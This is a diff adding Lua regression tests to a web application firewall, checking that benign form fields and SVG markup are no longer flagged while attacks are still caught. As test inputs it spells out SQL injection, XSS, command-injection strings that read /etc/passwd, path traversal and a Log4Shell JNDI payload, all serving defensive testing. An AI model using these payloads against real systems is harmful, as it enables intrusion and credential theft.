@@ -2765,6 +2765,204 @@ do
     end)
 end
 
+-- ============ 误伤回归：multipart 普通字段含英文 and/or（2026-11-13）============
+-- 现场：question="菲律宾的AFFIDAVIT OF SUPPORT AND GUARANTEE的公证怎么办理？" 与
+-- conid=0 一起被判 sqli。multipart_text_parts 把 part 头部整行送检时，两个
+-- name="..." 凑出「引号计数 >= 2 + 等号关系」，再加上字段值里的独立单词 and，
+-- 正好命中 detect_sqli 的引号计数规则。修法是剥掉头部赋值的语法外壳。
+print("=== 误伤回归：multipart 普通字段含 and/or ===")
+do
+    local MP_B = "----WebKitFormBoundary9A7hmBFxsyqt5ZJ1"
+    local sem = require("waf.semantic")
+    sem.set_level("balanced")
+    sem.set_disabled_detectors(nil)
+
+    local function multi_body(fields)
+        local t = {}
+        for _, f in ipairs(fields) do
+            local head = 'Content-Disposition: form-data; name="' .. f[1] .. '"'
+            if f[3] then head = head .. '; filename="' .. f[3] .. '"' end
+            t[#t + 1] = "--" .. MP_B .. "\r\n" .. head .. "\r\n\r\n" .. f[2]
+        end
+        t[#t + 1] = "--" .. MP_B .. "--\r\n"
+        return table.concat(t, "\r\n")
+    end
+
+    local function post_form(name, b, expect_block)
+        access_scenario(name, site_with(nil), function()
+            T.vars.remote_addr = "1.2.3.4"
+            T.vars.uri = "/api/v1/assistant/chat"
+            T.vars.request_uri = "/api/v1/assistant/chat"
+            T.vars.query_string = nil
+            T.vars.content_type = "multipart/form-data; boundary=" .. MP_B
+            T.vars.http_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " ..
+                "(KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+            T.method = "POST"
+            T.body = b
+        end, function()
+            if expect_block then return ngx.status == 403 and T.exited == 403 end
+            return T.exited == nil and ngx.status ~= 403
+        end)
+    end
+
+    local QUESTION = "菲律宾的AFFIDAVIT OF SUPPORT AND GUARANTEE的公证怎么办理？"
+    post_form("现场请求：英文 AND 标题 + conid 放行",
+        multi_body({{"question", QUESTION}, {"conid", "0"}}), false)
+    post_form("普通英文 Tom and Jerry 放行",
+        multi_body({{"q", "Tom and Jerry"}, {"page", "1"}}), false)
+    post_form("普通英文 research or development 放行",
+        multi_body({{"q", "research or development"}, {"page", "1"}}), false)
+    post_form("三字段含 and 放行",
+        multi_body({{"q", "A and B"}, {"page", "1"}, {"size", "20"}}), false)
+    post_form("纯中文提问放行（对照）",
+        multi_body({{"q", "公证怎么办理？"}, {"conid", "0"}}), false)
+    post_form("字段名藏 SQLi 仍拦（无绕过）",
+        multi_body({{"q' OR '1'='1", "hello"}, {"conid", "0"}}), true)
+    post_form("字段值 SQLi 仍拦（无绕过）",
+        multi_body({{"q", "1' OR '1'='1"}, {"conid", "0"}}), true)
+    post_form("字段值 admin'-- 仍拦（无绕过）",
+        multi_body({{"user", "admin'--"}, {"conid", "0"}}), true)
+    post_form("filename 路径穿越仍拦（无绕过）",
+        multi_body({{"file", "hello", "../../etc/passwd"}, {"conid", "0"}}), true)
+    post_form("纯文本文件区 SQLi 仍拦（无绕过）",
+        multi_body({{"file", "1' OR '1'='1", "note.txt"}}), true)
+
+    -- 证明修复落在「请求体拼接」而不是把 SQLi 检测器改松：
+    -- 手工拼出带两对引号 + 等号 + and 的串，检测器依然判 sqli。
+    check("SQLi 检测器本身未放松（结构串仍判 sqli）",
+        sem.detect_sqli('name="question" and x name="conid"') == true)
+
+    -- ===== 2026-11-13 全量误伤审计追加 =====
+    -- 1) 字段名恰好是 shell 命令名（id/ls/cat/...）。旧拼接留下
+    --    "Content-Disposition: form-data; id"，被 meta_then_cmd 判成 RCE；
+    --    且头部整行的引号 + 等号叠加英文 and 会判 SQLi。现在只送裸值。
+    for _, fname in ipairs({"id", "ls", "cat", "env", "who", "set"}) do
+        post_form("字段名 " .. fname .. " 不判 RCE/SQLi",
+            multi_body({{fname, "0"}, {"content", "Hello and welcome"}}), false)
+    end
+    post_form("字段名 id + 英文 AND 组合放行",
+        multi_body({{"id", "123"}, {"q", "Tom and Jerry"}, {"page", "1"}}), false)
+
+    -- 2) 正常 SVG 是合法富文本，<svg> 标签本身不再无条件判 XSS；
+    --    带事件属性 / 脚本的形态仍必须拦。
+    check("正常 SVG 图标放行", sem.inspect(
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2L2 22h20z"/></svg>',
+        "/api/v1/assistant/chat") == nil)
+    check("内联 SVG 放行", sem.inspect(
+        '<div><svg class="icon"><rect width="10" height="10"/></svg></div>',
+        "/api/v1/assistant/chat") == nil)
+    check("<svg onload=...> 仍拦", sem.detect_xss("<svg onload=alert(1)>"))
+    check("<svg/onload=...> 仍拦", sem.detect_xss("<svg/onload=alert(1)>"))
+    check("<svg><script> 仍拦", sem.detect_xss("<svg><script>alert(1)</script></svg>"))
+
+    -- 3) ORDER BY 要求 SQL 上下文；纯英文 "sort order by 2 columns" 不判注入。
+    --    生产 PCRE 候选比本机兜底宽得多，必须直接验检测器而不只看 inspect。
+    check("正常英文 order by 2 不判 SQLi", not sem.detect_sqli("sort order by 2 columns"))
+    check("正常英文 order by 3 不判 SQLi", not sem.detect_sqli("Please order by 3 items at most"))
+    check("1' ORDER BY 10-- 仍拦", sem.detect_sqli("1' ORDER BY 10--"))
+    check("id=1 ORDER BY 10 仍拦", sem.detect_sqli("id=1 ORDER BY 10"))
+end
+
+
+-- ===== 2026-11-13 多角度独立测试回归（4 路子智能体交叉确认） =====
+-- A 正常业务误伤 / B 攻击检出与绕过 / C 完整链路 / D 控制面一致性。
+-- 关键口径：本机兜底候选筛比生产 PCRE 窄，逐个直跑全部 detector 才是完整误报面。
+do
+    sem.set_level("balanced")
+    sem.set_disabled_detectors(nil)
+    local DETS = {}
+    for k, f in pairs(sem) do
+        if k:match("^detect_") and type(f) == "function" then DETS[#DETS + 1] = k end
+    end
+    local function any_detector(v)
+        for _, k in ipairs(DETS) do
+            local ok, hit = pcall(sem[k], v, "/api/v1/assistant/ask", v)
+            if ok and hit then return k end
+        end
+        return nil
+    end
+    local function clean(name, v)
+        local h = sem.inspect(v, "/api/v1/assistant/ask")
+        check(name, h == nil and any_detector(v) == nil)
+    end
+    local function blocked(name, v)
+        check(name, sem.inspect(v, "/api/v1/assistant/ask") ~= nil)
+    end
+
+    -- 1) 正常业务语料：此前会 100% 误判的 8 类根因
+    clean("正常英文 order by 2? 放行", "Can you order by 2 columns and update the report?")
+    clean("JSON order by 2? 放行", '{"q":"order by 2?"}')
+    clean("sort order by 2 columns 放行", "sort order by 2 columns")
+    clean("Please order by 3 items 放行", "Please order by 3 items at most")
+    clean("believe it or not 放行", "believe it or not")
+    clean("whether or not 放行", "whether or not to update the profile")
+    clean("delete ... from ... 英文句子放行", "please delete the old file from the archive")
+    clean("insert ... into ... 英文句子放行", "please insert the coin into the slot")
+    clean("update the set of options 放行", "update the set of available options")
+    clean("${user.name} 模板占位符放行", "Hello ${user.name}, welcome")
+    clean("${server.port} 配置占位符放行", "server.port=${server.port}")
+    clean("Markdown python 代码围栏放行", "```python\nprint(1)\n```")
+    clean("Markdown bash 代码围栏放行", "```bash\necho hello\n```")
+    clean("Cookie 多字段 ; id= 放行", "session=abc123; id=1001; theme=dark")
+    clean("form ; id= 放行", "note=hello; id=42&action=save")
+    clean("Referer matrix 参数 ;id= 放行", "https://example.com/path;id=123?order=2")
+    clean("正常 SVG 图标放行", '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>')
+    clean("正常 <use #icon> 放行", '<svg><use xlink:href="#icon-warning"/></svg>')
+    clean("data URI 图片放行", '{"image":"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ=="}')
+
+    -- 2) 攻击对照：修误伤不能削弱真实攻击检出
+    blocked("裸值 1 ORDER BY 10 仍拦", "1 ORDER BY 10")
+    blocked("URL 编码 ORDER BY 仍拦", "%31%20ORDER%20BY%2010")
+    blocked("双重编码 ORDER BY 仍拦", "%2531%2520ORDER%2520BY%252010")
+    check("1' ORDER BY 10-- 仍拦", sem.detect_sqli("1' ORDER BY 10--"))
+    check("id=1 ORDER BY 10 仍拦", sem.detect_sqli("id=1 ORDER BY 10"))
+    check("INSERT INTO 注入仍拦", sem.detect_sqli("INSERT INTO users VALUES(1)"))
+    check("DELETE FROM 注入仍拦", sem.detect_sqli("DELETE FROM users WHERE id=1"))
+    check("UPDATE SET 注入仍拦", sem.detect_sqli("UPDATE users SET role='admin'"))
+    check("1 OR true-- 仍拦", sem.detect_sqli("1 OR true--"))
+    check("1 OR NOT 1=0 仍拦", sem.detect_sqli("1 OR NOT 1=0"))
+    check("id=1 AND false# 仍拦", sem.detect_sqli("id=1 AND false#"))
+    check("经典 ' OR '1'='1 仍拦", sem.detect_sqli("x=' OR '1'='1"))
+    check("${7*7} SSTI 仍拦", sem.detect_ssti("${7*7}"))
+    check("${jndi:} Log4Shell 仍拦", sem.detect_log4shell("${jndi:ldap://example.invalid/a}"))
+    check("<svg onload> XSS 仍拦", sem.detect_xss("<svg onload=alert(1)>"))
+    check("<animate onbegin> XSS 仍拦", sem.detect_xss("<svg><animate onbegin=alert(1) attributeName=x dur=1s>"))
+    check("<set onbegin> XSS 仍拦", sem.detect_xss("<svg><set onbegin=alert(1) attributeName=x to=1/>"))
+    check("<animateTransform onrepeat> XSS 仍拦", sem.detect_xss("<svg><animateTransform onrepeat=alert(1)/>"))
+    check("<use data:svg> XSS 仍拦", sem.detect_xss('<svg><use xlink:href="data:image/svg+xml;base64,PHN2Zz4="/></svg>'))
+    check("<script> XSS 仍拦", sem.detect_xss("<script>alert(1)</script>"))
+    check("; cat /etc/passwd 仍拦", sem.detect_rce("x=1; cat /etc/passwd"))
+    check("; id 仍拦", sem.detect_rce("x=1; id"))
+    check("&& whoami 仍拦", sem.detect_rce("x=1 && whoami"))
+    check("| id 仍拦", sem.detect_rce("x=1 | id"))
+    check("; base64 -d 注入仍拦", sem.detect_rce("?x=; base64 -d /etc/passwd"))
+    check("sqlmap UA 仍拦", bot.classify("sqlmap/1.5.2 #stable") == "bad")
+
+    -- 3) 正常客户端库 UA（注释已声明保护 OkHttp，词表却仍列 okhttp）
+    check("okhttp UA 放行", bot.classify("okhttp/4.9.3") == nil)
+    check("axios UA 放行", bot.classify("axios/1.6.2") == nil)
+    check("node-fetch UA 放行", bot.classify("node-fetch/2.7.0") == nil)
+    check("guzzlehttp UA 放行", bot.classify("guzzlehttp/7") == nil)
+
+    -- 4) multipart 头部裸值解析：不能因修误伤丢掉字段名/文件名里的 payload
+    local dir = (arg and arg[0] or ""):match("^(.*[/\\])") or ""
+    local af = assert(io.open(dir .. "access.lua"))
+    local asrc = af:read("*a"); af:close()
+    local ssrc = assert(asrc:match("(local function strip_header_assign%(head%).-\nend)\n"), "strip fn")
+    local msrc = assert(asrc:match("(local function multipart_text_parts%(body%).-\nend)\n"), "mp fn")
+    local join = assert(loadstring(ssrc .. "\n" .. msrc .. "\nreturn multipart_text_parts"))()
+    local function mp(field, value)
+        return "------BND\r\n" .. field .. "\r\n\r\n" .. value .. "\r\n------BND--\r\n"
+    end
+    clean("字段名 id + 英文 and 放行", join(mp('Content-Disposition: form-data; name="id"', "Tom and Jerry")))
+    check("无引号字段名藏 SQLi 仍拦", sem.inspect(join(mp("Content-Disposition: form-data; name=1' OR '1'='1", "x")), "/api/v1/upload") ~= nil)
+    check("字段名值内引号藏 SQLi 仍拦", sem.inspect(join(mp('Content-Disposition: form-data; name="a" OR "1"="1', "x")), "/api/v1/upload") ~= nil)
+    check("字段名 ;id 仍拦", sem.inspect(join(mp('Content-Disposition: form-data; name=";id"', "x")), "/api/v1/upload") ~= nil)
+    -- detect_upload 在真实链路里吃的是原始 body（文件名扩展名在结构上），不是拼接串
+    check("filename x;id.php 仍拦", sem.detect_upload(mp('Content-Disposition: form-data; name="f"; filename="x;id.php"', "x")))
+    check("filename 路径穿越仍拦", sem.inspect(join(mp('Content-Disposition: form-data; name="f"; filename="../../etc/passwd"', "x")), "/api/v1/upload") ~= nil)
+end
+
 print(string.format("\n%d passed, %d failed", pass, fail))
 os.remove(RULES_FILE)
 if fail > 0 then os.exit(1) end
